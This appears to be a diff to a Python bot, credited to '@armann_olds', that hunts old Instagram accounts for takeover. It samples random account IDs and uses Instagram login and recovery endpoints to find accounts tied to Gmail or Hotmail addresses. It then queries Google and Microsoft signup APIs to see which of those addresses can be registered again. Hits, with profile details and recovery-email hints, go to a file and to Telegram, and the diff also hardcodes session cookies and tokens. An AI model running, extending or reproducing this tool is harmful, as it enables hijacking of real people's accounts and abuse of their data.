@@ -28,7 +28,7 @@ class qredes:
 🚀 BOT STARTED SUCCESSFULLY! 🚀
 ━━━━━━━━━━━━━━━━
 ✅ Bot is now running on Render
-✅ Searching for available accounts
+✅ Searching OLD Instagram accounts (2010-2013)
 ✅ Will notify you of any hits
 
 Status: ACTIVE 🟢
@@ -43,19 +43,19 @@ By: @armann_olds
         
         print('[+] Initialization complete. Starting threads...')
         # Start worker threads
-        for i in range(50):
+        for i in range(100):
             Thread(target=self.home, daemon=True).start()
         
-        print(f'[+] Started 50 worker threads')
+        print(f'[+] Started 100 worker threads')
         
         # Keep main thread alive
         try:
             while True:
                 time_module.sleep(60)
-                # Send status update every hour
-                if int(time()) % 3600 < 60:
+                # Send status update every 2 hours
+                if int(time()) % 7200 < 60:
                     status_msg = f'''
-📊 HOURLY STATUS UPDATE
+📊 STATUS UPDATE
 ━━━━━━━━━━━━━━━━
 ✅ Hits Found: {self.hits}
 📧 Bad Emails: {self.bad_email}
@@ -144,150 +144,151 @@ Status: RUNNING 🟢
         return False
 
     def insta1(self, email):
-        try:
-            csrftoken = md5(str(time()).encode()).hexdigest()
-            headers = {
-                'accept': '*/*',
-                'accept-language': 'en-US,en;q=0.9',
-                'content-type': 'application/x-www-form-urlencoded',
-                'origin': 'https://www.instagram.com',
-                'referer': 'https://www.instagram.com/?lang=en-US&hl=en-gb',
-                'user-agent': 'Mozilla/5.0 (Linux; Android 13; ANY-LX2 Build/HONORANY-L22CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6422.147 Mobile Safari/537.36 InstagramLite 1.0.0.0.145 Android (33/13; 480dpi; 1080x2298; HONOR; ANY-LX2; HNANY-Q1; qcom; ar_IQ_#u-nu-latn; 115357035)',
-                'x-csrftoken': csrftoken,
-            }
-            data = {
-                'username': email,
-            }
-            response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', 
-                                    headers=headers, data=data, timeout=10).text
-            
-            # Check for account existence indicators
-            if 'showAccountRecoveryModal' in response:
-                return True
-            if 'user_id' in response:
-                return True
-            if 'authenticated' in response:
-                return True
-                
-            return False
-        except Exception as e:
-            return False
+        while True:
+            try:
+                csrftoken = md5(str(time()).encode()).hexdigest()
+                headers = {
+                    'accept': '*/*',
+                    'accept-language': 'en-US,en;q=0.9',
+                    'content-type': 'application/x-www-form-urlencoded',
+                    'origin': 'https://www.instagram.com',
+                    'referer': 'https://www.instagram.com/?lang=en-US&hl=en-gb',
+                    'user-agent': 'Mozilla/5.0 (Linux; Android 13; ANY-LX2 Build/HONORANY-L22CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6422.147 Mobile Safari/537.36 InstagramLite 1.0.0.0.145 Android (33/13; 480dpi; 1080x2298; HONOR; ANY-LX2; HNANY-Q1; qcom; ar_IQ_#u-nu-latn; 115357035)',
+                    'x-csrftoken': csrftoken,
+                }
 
+                data = {
+                    'username': email,
+                }
+
+                response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data, timeout=10).text
+                if 'showAccountRecoveryModal' in response:
+                    return True
+                else:
+                    return False
+            except:
+                return False
+    
     def insta2(self, email):
-        try:
-            url = 'https://b.i.instagram.com/api/v1/accounts/login/'
-            headers = {
-                'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
-                'Accept': '*/*',
-                'Cookie': 'missing',
-                'Accept-Encoding': 'gzip, deflate',
-                'Accept-Language': 'en-US',
-                'X-IG-Capabilities': '3brTvw==',
-                'X-IG-Connection-Type': 'WIFI',
-                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'Host': 'i.instagram.com'
-            }
-            uid = str(uuid4())
-            data = {
-                'uuid': uid,
-                'password': 'testpassword123',
-                'username': email,
-                'device_id': uid,
-                'from_reg': 'false',
-                '_csrftoken': 'missing',
-                'login_attempt_count': '0'
-            }
-            re = requests.post(url, headers=headers, data=data, timeout=10).text
-            
-            # If we get bad_password, the account exists
-            if 'bad_password' in re:
-                return True
-            if 'user_id' in re:
-                return True
-            if 'logged_in_user' in re:
-                return True
-                
-            return False
-        except Exception as e:
-            return False
+        while True:
+            try:
+                url = 'https://b.i.instagram.com/api/v1/accounts/login/'
+                headers = {
+                    'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
+                    'Accept': '*/*',
+                    'Cookie': 'missing',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Accept-Language': 'en-US',
+                    'X-IG-Capabilities': '3brTvw==',
+                    'X-IG-Connection-Type': 'WIFI',
+                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'Host': 'i.instagram.com'
+                }
+                uid = str(uuid4())
+                data = {
+                    'uuid': uid,
+                    'password': 'ffffdddddaaa666',
+                    'username': email,
+                    'device_id': uid,
+                    'from_reg': 'false',
+                    '_csrftoken': 'missing',
+                    'login_attempt_countn': '0'
+                }
+                re = requests.post(url, headers=headers, data=data, timeout=10).text
+                if 'bad_password' in re:
+                    return True
+                else:
+                    return False
+            except:
+                return False
 
     def check_gmail(self, email):
-        try:
-            username = email.split('@')[0] if '@' in email else email
-            tim = str(int(time()))
-            
-            headers = {
-                'authority': 'accounts.google.com',
-                'accept': '*/*',
-                'accept-language': 'en-US,en;q=0.9',
-                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
-                'origin': 'https://accounts.google.com',
-                'referer': 'https://accounts.google.com/',
-                'user-agent': generate_user_agent(),
-                'x-same-domain': '1',
-            }
-            
-            # Check if Gmail is available
-            params = {
-                'biz': 'false',
-                'continue': 'https://mail.google.com/mail/',
-                'ddm': '0',
-                'dsh': f'S-{tim}:1722139307145196',
-                'flowEntry': 'SignUp',
-                'flowName': 'GlifWebSignIn',
-            }
-            
-            data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{username}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C0%2C3948%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&'
-            
-            response = requests.post(
-                'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
-                params=params,
-                headers=headers,
-                data=data,
-                timeout=10
-            ).text
-            
-            # If response contains these, email is likely available
-            if 'signup' in response or 'TL' in response:
-                return True
-            
-            return False
-        except Exception as e:
-            return False
+        while True:
+            try:
+                if '@' in email:
+                    email = email.split('@')[0]
+                tim = (str(time()).split('.')[0])
+                headers = {
+                    'authority': 'accounts.google.com',
+                    'accept': '*/*',
+                    'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
+                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+                    'cookie': 'HSID=A3TxC-A0yRsCA1dOO; SSID=ARenU9ksEOCIaEO4P; APISID=hnQUEqtNc5vHjhT9/AawmOWOOgkqM5vJze; __Host-GAPS=1:A5k8RauTcQc3xH2K66ARptqQB1AK0KdW5aT-RVZponPE3KiUShdpDjzVOMKscyGbCOTsVTxN6fuwkjWokE8qNLrm6MR4pg:hClD8NNycPp_GmJW;',
+                    'origin': 'https://accounts.google.com',
+                    'referer': 'https://accounts.google.com/',
+                    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-platform': '"Linux"',
+                    'sec-fetch-dest': 'empty',
+                    'sec-fetch-mode': 'cors',
+                    'sec-fetch-site': 'same-origin',
+                    'user-agent': generate_user_agent(),
+                    'x-same-domain': '1',
+                }
+                par = {
+                    'biz': 'false',
+                    'continue': 'https://mail.google.com/mail/mu/mp/580/?login=1',
+                    'ddm': '0',
+                    'dsh': f'S-{tim}:1722139307145196',
+                    'flowEntry': 'SignUp',
+                    'flowName': 'GlifWebSignIn',
+                }
+                re = requests.get(f'https://accounts.google.com/lifecycle/flows/signup?continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fmu%2Fmp%2F580%2F%3Flogin%3D1&ddm=0&flowEntry=SignUp&flowName=GlifWebSignIn&dsh=S{tim}%3A1722152876221519', params=par, cookies=None, headers=headers, timeout=10)
+                try:
+                    tok = re.text.split("3DGlifWebSignIn%26TL%3D")[2].split("','")[0]
+                except:
+                    pass
+                
+                data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{email}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C0%2C3948%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at=AGxDo0eKMHZmgEC_FYSd7DksXn11%3A1722139309078&'
+                params = {
+                    'TL': tok,
+                }
+                re = requests.post(
+                    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
+                    params=params,
+                    cookies=None,
+                    headers=headers,
+                    data=data,
+                    timeout=10
+                ).text
+                if 'signup' in re:
+                    return True
+                else:
+                    return False
+            except Exception as e:
+                return False
 
     def check_hotmail(self, email):
-        if not self.amsc or not self.canary:
-            return False
-            
-        try:
-            cookies = {
-                'amsc': self.amsc,
-            }
-            headers = {
-                'accept': 'application/json',
-                'accept-language': 'en-US,en;q=0.9',
-                'canary': self.canary,
-                'content-type': 'application/json; charset=utf-8',
-                'origin': 'https://signup.live.com',
-                'referer': 'https://signup.live.com/',
-                'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
-            }
-            json_data = {
-                'signInName': email,
-            }
-            response = requests.post('https://signup.live.com/API/CheckAvailableSigninNames', 
-                                    cookies=cookies, headers=headers, json=json_data, timeout=10).text
-            if '"isAvailable":true' in response:
-                return True
-            return False
-        except Exception as e:
-            return False
+        while True:
+            try:
+                cookies = {
+                    'amsc': self.amsc,
+                }
+                headers = {
+                    'accept': 'application/json',
+                    'accept-language': 'en-US,en;q=0.9',
+                    'canary': self.canary,
+                    'content-type': 'application/json; charset=utf-8',
+                    'origin': 'https://signup.live.com',
+                    'referer': 'https://signup.live.com/',
+                    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
+                }
+                json_data = {
+                    'signInName': email,
+                }
+                response = requests.post('https://signup.live.com/API/CheckAvailableSigninNames', cookies=cookies, headers=headers, json=json_data, timeout=10).text
+                if '"isAvailable":true' in response:
+                    return True
+                else:
+                    return False
+            except Exception as e:
+                return False
 
     def get_info(self, username, domen):
         try:
             headers = {
-                'X-Pigeon-Session-Id': str(uuid4()),
-                'X-Pigeon-Rawclienttime': str(time()),
+                'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
+                'X-Pigeon-Rawclienttime': '1700251574.982',
                 'X-IG-Connection-Speed': '-1kbps',
                 'X-IG-Bandwidth-Speed-KBPS': '-1.000',
                 'X-IG-Bandwidth-TotalBytes-B': '0',
@@ -298,44 +299,35 @@ Status: RUNNING 🟢
                 'X-IG-App-ID': '567067343352427',
                 'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
                 'Accept-Language': 'en-GB, en-US',
-                'Cookie': f'mid={md5(str(time()).encode()).hexdigest()}; csrftoken={md5(str(time()).encode()).hexdigest()}',
+                'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'Accept-Encoding': 'gzip, deflate',
                 'Host': 'i.instagram.com',
                 'X-FB-HTTP-Engine': 'Liger',
                 'Connection': 'keep-alive',
+                'Content-Length': '356',
             }
-            
-            csrf = md5(str(time()).encode()).hexdigest()
             data = {
-                'signed_body': f'{md5(str(time()).encode()).hexdigest()}.{{"_csrftoken":"{csrf}","adid":"{str(uuid4())}","guid":"{str(uuid4())}","device_id":"android-{md5(str(time()).encode()).hexdigest()[:16]}","query":"{username}"}}',
+                'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"' + username + '"}',
                 'ig_sig_key_version': '4',
             }
-            
-            rest = None
             try:
-                response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', 
-                                        headers=headers, data=data, timeout=10)
-                rest = response.json().get('email', None)
+                response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data, timeout=10)
+                rest = response.json()['email']
             except:
-                pass
-            
-            # Get Instagram profile info
+                rest = None
             headers = {
                 'accept': '*/*',
                 'accept-language': 'en',
-                'referer': f'https://www.instagram.com/{username}/',
-                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+                'referer': 'https://www.instagram.com/{}/'.format(username),
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
                 'x-ig-app-id': '936619743392459',
+                'x-ig-www-claim': '0',
                 'x-requested-with': 'XMLHttpRequest',
             }
             params = {
                 'username': username,
             }
-            
-            followerNum = followingNum = postNum = 'N/A'
-            isPraise = full_name = biography = id = 'N/A'
-            date = 'N/A'
-            
             try:
                 response = requests.get(
                     'https://www.instagram.com/api/v1/users/web_profile_info/',
@@ -343,170 +335,210 @@ Status: RUNNING 🟢
                     headers=headers,
                     timeout=10
                 ).json()
-                
-                user_data = response.get('data', {}).get('user', {})
-                followerNum = user_data.get('edge_followed_by', {}).get('count', 'N/A')
-                followingNum = user_data.get('edge_follow', {}).get('count', 'N/A')
-                postNum = user_data.get('edge_owner_to_timeline_media', {}).get('count', 'N/A')
-                isPraise = user_data.get('is_private', 'N/A')
-                full_name = user_data.get('full_name', 'N/A')
-                biography = user_data.get('biography', 'N/A')
-                id = user_data.get('id', 'N/A')
-                
-                if id and id != 'N/A':
-                    try:
-                        date = requests.get(f'https://mel7n.pythonanywhere.com/?id={id}', timeout=5).json().get('date', 'N/A')
-                    except:
-                        pass
             except:
-                pass
-            
-        except Exception as e:
-            followerNum = followingNum = postNum = 'N/A'
-            isPraise = full_name = biography = id = rest = date = 'N/A'
-        
-        info = f'''
-⌯ Hi Arman Got Hit
-ᯓᯓᯓᯓᯓᯓᯓᯓ
-folowers : {followerNum}
-following : {followingNum}
-total posts : {postNum}
-isPraise : {isPraise}
-username : {username}
-email : {username}@{domen}
-date : {date}
-id : {id}
-full name : {full_name}
-bio : {biography}
-rest : {rest}
-ᯓᯓᯓᯓᯓᯓᯓᯓ
-by : @armann_olds
-'''
-        
-        print(info)
-        
-        # Save to file
-        try:
-            with open('hits.txt', 'a', encoding='utf-8') as f:
+                response = None
+            try:
+                id = response['data']['user']['id']
+            except:
+                id = None
+            try:
+                followerNum = response['data']['user']['edge_followed_by']['count']
+            except:
+                followerNum = None
+            try:
+                followingNum = response['data']['user']['edge_follow']['count']
+            except:
+                followingNum = None
+            try:
+                postNum = response['data']['user']['edge_owner_to_timeline_media']['count']
+            except:
+                postNum = None
+            try:
+                isPraise = response['data']['user']['is_private']
+            except:
+                isPraise = None
+            try:
+                full_name = response['data']['user']['full_name']
+            except:
+                full_name = None
+            try:
+                biography = response['data']['user']['biography']
+            except:
+                biography = None
+            try:
+                if id == None:
+                    date = None
+                else:
+                    try:
+                        date = requests.get('https://mel7n.pythonanywhere.com/?id={}'.format(id), timeout=5).json()['date']
+                    except:
+                        date = None
+            except:
+                date = None
+            info = '''
+
+  ⌯ Hi Arman Got Hit
+  ᯓᯓᯓᯓᯓᯓᯓᯓ
+  folowers : {}
+  following : {}
+  total posts : {}
+  isPraise : {}
+  username : {}
+  email : {}@{}
+  date : {}
+  id : {}
+  full name : {}
+  bio : {}
+  rest : {}
+  ᯓᯓᯓᯓᯓᯓᯓᯓ
+  by : @armann_olds
+        '''.format(followerNum, followingNum, postNum, isPraise, username, username, domen, date, id, full_name, biography, rest)
+            print(info)
+            with open(f'hits.txt', 'a') as f:
                 f.write(info + '\n')
         except:
-            pass
+            info = '''
+
+          ⌯ Hi Arman Got Hit
+          ᯓᯓᯓᯓᯓᯓᯓᯓ
+          folowers : {}
+          following : {}
+          total posts : {}
+          isPraise : {}
+          username : {}
+          email : {}@{}
+          date : {}
+          id : {}
+          full name : {}
+          bio : {}
+          rest : {}
+          ᯓᯓᯓᯓᯓᯓᯓᯓ
+          by : @Armannn_olds
+                '''.format(None, None, None, None, username, username, domen, None, None, None, None, None)
+            print(info)
+            with open(f'hits.txt', 'a') as f:
+                f.write(info + '\n')
         
         # Send to Telegram
-        self.send_telegram(info)
+        while True:
+            try:
+                self.send_telegram(info)
+                return
+            except:
+                pass
 
     def get_username(self):
-        try:
-            headers = {
-                'accept': '*/*',
-                'accept-language': 'en-US,en;q=0.9',
-                'content-type': 'application/x-www-form-urlencoded',
-                'origin': 'https://www.instagram.com',
-                'priority': 'u=1, i',
-                'sec-ch-ua': '"Chromium";v="125", "Not.A/Brand";v="24"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-platform': '"Windows"',
-                'sec-fetch-dest': 'empty',
-                'sec-fetch-mode': 'cors',
-                'sec-fetch-site': 'same-origin',
-                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
-                'x-asbd-id': '129477',
-                'x-csrftoken': md5(str(time()).encode()).hexdigest(),
-                'x-ig-app-id': '936619743392459',
-            }
-            
-            random_id = randrange(1, 60000000000)
-            
-            data = {
-                'variables': f'{{"id":"{random_id}","render_surface":"PROFILE"}}',
-                'doc_id': '7663723823674585',
-            }
-            
-            response = requests.post('https://www.instagram.com/graphql/query', 
-                                    headers=headers, data=data, timeout=10).json()
-            
-            username = response.get('data', {}).get('user', {}).get('username')
-            
-            if username:
+        while True:
+            try:
+                headers = {
+                    'accept': '*/*',
+                    'accept-language': 'en-US,en;q=0.9',
+                    'content-type': 'application/x-www-form-urlencoded',
+                    'origin': 'https://www.instagram.com',
+                    'priority': 'u=1, i',
+                    'sec-ch-prefers-color-scheme': 'dark',
+                    'sec-ch-ua': '"Opera";v="111", "Chromium";v="125", "Not.A/Brand";v="24"',
+                    'sec-ch-ua-full-version-list': '"Opera";v="111.0.5168.61", "Chromium";v="125.0.6422.143", "Not.A/Brand";v="24.0.0.0"',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-model': '""',
+                    'sec-ch-ua-platform': '"Windows"',
+                    'sec-ch-ua-platform-version': '"10.0.0"',
+                    'sec-fetch-dest': 'empty',
+                    'sec-fetch-mode': 'cors',
+                    'sec-fetch-site': 'same-origin',
+                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0',
+                    'x-asbd-id': '129477',
+                    'x-bloks-version-id': '213c82555f99bb0cecb045c627a22f08209d7a699fc238c7e73a0482e70267f9',
+                    'x-csrftoken': 'QOeFYsOi8enKuW80uC0WezhvEgiydc2Y',
+                    'x-fb-friendly-name': 'PolarisProfilePageContentDirectQuery',
+                    'x-fb-lsd': '3TdmFoJ7r2hQowntSy6Exd',
+                    'x-ig-app-id': '936619743392459',
+                    'x-ig-www-claim': 'hmac.AR3iNxyHufbREf9pIUL6m2ciMIIxA3vQTyCHW_yWjgu5dmsq',
+                }
+                data = {
+                    'av': '17841408545457742',
+                    '__user': '0',
+                    '__a': '1',
+                    '__req': '53',
+                    '__hs': '19920.HYP:instagram_web_pkg.2.1..0.1',
+                    'dpr': '1',
+                    '__ccg': 'UNKNOWN',
+                    '__rev': '1014910249',
+                    '__s': 'lgqvll:0onelj:i7g1ua',
+                    '__hsi': '7392194034338563714',
+                    '__dyn': '7xeUjG1mxu1syaxG4Vp41twpUnwgU7SbzEdF8vyUco2qwJyEiw9-1DwUx60p-0LVE4W0om78c87m0yE462mcw5Mx62G5UswoEcE7O2l0Fwqo31w9O1TwQzXw8W58jwGzEaE2iwNwKxm5o2eUlwhEe88o5i7U1bobpEbUGdwtUd-2u2J08O321LwTwKG1pg2fwxyo6O1FwlEcUed6goK2OubK5V89FbxG6Uf9EO6UaU',
+                    '__csr': 'iMkMF5NsIh2I4Aggpik9SLfZgxAZOsJh6DcNcUFXH-GHqnlaoSiypHBiVaFkhtdFmO-AjjKW8DS8UVrnJ3vihVXAiHApWyu8CWACiKWQArCWl24rBWaJaHGSbyHl5Dz8yprKaKGGmjy9EhKUy8BACKmmuXWyryp-8Bgqw059QwmGw9y5e0aLypngsDPG4k5d0oU7T-swvg14U2Nxpa4kqdiul0l9m0ieq1OwSggwlE36w3ePGeG092xq2K250k8louxClkUPowHDmok6U26xm0Qkao4FhKEJK5riP0loV0cS0tu13wwx1G4kyKsa1Kcxqm2aE6C0BsMy1PxiohDk8wd_h8146148A9Cg6mWm0H944ye4QfAwbiaU5eUhERkq2y1Twjo96E9Hp9UiQcg1EQ2Smlo7eUG6oB7w0ovEbu3q0d8w7vw2a8dS1ywBQ0tN0',
+                    '__comet_req': '7',
+                    'fb_dtsg': 'NAcN9-rfGhppacO0TiJS1KOuTzGJmIJqDEX_mLq8xVMayYEUgtoQyxQ:17853599968089360:1719656032',
+                    'jazoest': '26445',
+                    'lsd': '3TdmFoJ7r2hQowntSy6Exd',
+                    '__spin_r': '1014910249',
+                    '__spin_b': 'trunk',
+                    '__spin_t': '1721129295',
+                    'fb_api_caller_class': 'RelayModern',
+                    'fb_api_req_friendly_name': 'PolarisProfilePageContentDirectQuery',
+                    'variables': '{"id":"' + str(randrange(1, 300000000)) + '","render_surface":"PROFILE"}',
+                    'server_timestamps': 'true',
+                    'doc_id': '7663723823674585',
+                }
+                username = requests.post('https://www.instagram.com/graphql/query', cookies={}, headers=headers, data=data, timeout=10).json()['data']['user']['username']
                 return [username]
-            return None
-            
-        except Exception as e:
-            return None
+            except Exception as e:
+                pass
 
     def home(self):
         while True:
             try:
-                sys.stdout.write(f'\r[Stats] Hits: {self.hits} | Bad IG: {self.bad_instgram} | Bad Email: {self.bad_email} | Good IG: {self.good_insgram}')
-                sys.stdout.flush()
+                sys.stdout.write(f'''\rHits : {self.hits} Bad Instagram {self.bad_instgram} Bad Email : {self.bad_email} Good Instgram : {self.good_insgram}\r''')
 
-                # Get username
-                usernames = self.get_username()
-                if not usernames:
-                    time_module.sleep(2)
-                    continue
-                
+                while True:
+                    try:
+                        usernames = self.get_username()
+                        if usernames == None:
+                            pass
+                        else:
+                            break
+                    except:
+                        pass
                 for username in usernames:
-                    # Check both Gmail and Hotmail
-                    email1 = f'{username}@gmail.com'
-                    email2 = f'{username}@hotmail.com'
-                    
-                    # Use both methods for Instagram check
-                    api1 = choice('12')
-                    api2 = choice('12')
-                    
-                    # Check Gmail
-                    try:
-                        if api1 == '1':
-                            s11 = self.insta1(email1)
+                    sys.stdout.write(f'''\rHits : {self.hits} Bad Instagram {self.bad_instgram} Bad Email : {self.bad_email} Good Instgram : {self.good_insgram}\r''')
+                    api1 = choice('122')
+                    api2 = choice('122')
+                    email1 = username + '@gmail.com'
+                    email2 = username + '@hotmail.com'
+                    if '1' == api1:
+                        s11 = self.insta1(email1)
+                    elif '2' == api1:
+                        s11 = self.insta2(email1)
+                    if '1' == api2:
+                        s22 = self.insta1(email2)
+                    elif '2' == api2:
+                        s22 = self.insta2(email2)
+                    if s11 == True:
+                        self.good_insgram += 1
+                        qq = self.check_gmail(email1)
+                        if qq == True:
+                            self.hits += 1
+                            username, domen = email1.split('@')
+                            self.get_info(username, domen)
                         else:
-                            s11 = self.insta2(email1)
-                            
-                        if s11:
-                            self.good_insgram += 1
-                            qq = self.check_gmail(email1)
-                            if qq:
-                                self.hits += 1
-                                print(f'\n[🎯 HIT!] Found: {email1}')
-                                self.get_info(username, 'gmail.com')
-                            else:
-                                self.bad_email += 1
-                        else:
-                            self.bad_instgram += 1
-                    except Exception as e:
+                            self.bad_email += 1
+                    else:
                         self.bad_instgram += 1
-                    
-                    time_module.sleep(0.3)
-                    
-                    # Check Hotmail
-                    try:
-                        if api2 == '1':
-                            s22 = self.insta1(email2)
+                    if s22 == True:
+                        self.good_insgram += 1
+                        qq = self.check_hotmail(email2)
+                        if qq == True:
+                            self.hits += 1
+                            username, domen = email2.split('@')
+                            self.get_info(username, domen)
                         else:
-                            s22 = self.insta2(email2)
-                            
-                        if s22:
-                            self.good_insgram += 1
-                            qq = self.check_hotmail(email2)
-                            if qq:
-                                self.hits += 1
-                                print(f'\n[🎯 HIT!] Found: {email2}')
-                                self.get_info(username, 'hotmail.com')
-                            else:
-                                self.bad_email += 1
-                        else:
-                            self.bad_instgram += 1
-                    except Exception as e:
+                            self.bad_email += 1
+                    else:
                         self.bad_instgram += 1
-                    
-                    time_module.sleep(0.5)
-                    
             except Exception as e:
-                time_module.sleep(3)
+                pass
 
 
 if __name__ == '__main__':
-    print('='*50)
-    print('Instagram Account Checker - Starting...')
-    print('='*50)
     qredes()
